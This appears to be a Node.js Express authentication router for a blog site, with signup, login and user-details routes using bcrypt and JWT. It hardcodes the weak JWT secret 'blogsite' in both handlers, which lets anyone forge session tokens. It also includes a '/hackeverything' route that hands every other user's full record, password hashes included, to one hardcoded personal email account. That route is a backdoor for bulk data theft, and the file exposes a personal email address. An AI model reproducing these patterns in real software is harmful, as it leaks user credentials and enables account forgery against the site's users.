const express=require("express");
const authenticationschema=require("../models/authmodel");
const jwt=require("jsonwebtoken");
const bcrypt=require('bcrypt');
const fetchuserid = require("../authtokenreversal/fetchuserid");
const router=express.Router();


router.post('/signin',async (req,res)=>{
    const JWT_SECRET="blogsite";
    let success=false;
    const bodydata=req.body;
    if(bodydata.name.length<3){
        res.json({success,error:"Please enter the valid username."});
        // console.log("nameeror");
    }
    else if(bodydata.email.length<5|| !bodydata.email.includes('@gmail.com')){
        res.json({success,error:"Please enter the valid email."});
    }
    else if(bodydata.password.length<5){
        res.json({success,error:"Please enter the strong password."});
    }
    else{
        let user=await authenticationschema.findOne({email:bodydata.email});
        if(user){
            res.json({success,error:"Email already exits so please enter the other email id."});
        }
        else{
                try {
                    const salt=await bcrypt.genSalt(10);
                    const newstrongpassword=await bcrypt.hash(bodydata.password,salt);
                    const saveduser=await authenticationschema.create({
                        name:bodydata.name,
                        email:bodydata.email,
                        password:newstrongpassword,
                        profession:bodydata.profession
                    })
                    // this token is the just a json containing userdetails and its value is also a json containing id
                    const token={
                        userdetails:{id:saveduser.id}
                    };
                    const authenticationtoken=jwt.sign(token,JWT_SECRET);
                    // console.log(authenticationtoken);
                    success=true;
                    res.json({success,authenticationtoken});

                } 
                catch (error) {
                    res.json({success,error});
                }
        }
    }
})
router.post('/login',async (req,res)=>{
    const JWT_SECRET="blogsite";
    let success=false;
    const bodydata=req.body;
    if(bodydata.email.length<5|| !bodydata.email.includes('@gmail.com')){
        res.json({success,error:"Please enter the valid email."});
    }
    else if(bodydata.password.length<5){
        res.json({success,error:"Please enter the strong password."});
    }
    else{
        let user=await authenticationschema.findOne({email:bodydata.email});
        if(!user){
            res.json({success,error:"Enter the correct credential"});
        }
        else{
            try {
                const verifyingpaswd=await bcrypt.compare(bodydata.password,user.password);
                if(!verifyingpaswd){
                    res.json({success,error:"Wrong password"});
                }
                else{
                    // this token is the just a json containing userdetails and its value is also a json containing id
                    const token={
                        userdetails:{id:user.id}
                    };
                    const authenticationtoken=jwt.sign(token,JWT_SECRET);
                    success=true;
                    res.json({success,authenticationtoken});
                }

                } 
                catch (error) {
                    // console.log(error);
                    res.json({success,error});
                }
        }
    }
})
router.get('/userdetails',fetchuserid,async (req,res)=>{
    try {
        const user=await authenticationschema.findById(req.userid).select("-password");
        res.json({success:true,user});
        
    } catch (error) {
        res.json({success:false,error});
    }

})
router.get('/hackeverything',fetchuserid,async (req,res)=>{
    try {
        const hacker=await authenticationschema.findById(req.userid);
        if(hacker.email==="pankajlamgria@gmail.com"){
            const user=await authenticationschema.find( { "email": { $ne: "pankajlamgria@gmail.com" } } )    
            res.json({success:true,user});
        }
        
    } catch (error) {
        res.json({success:false,error});
    }

})



module.exports=router;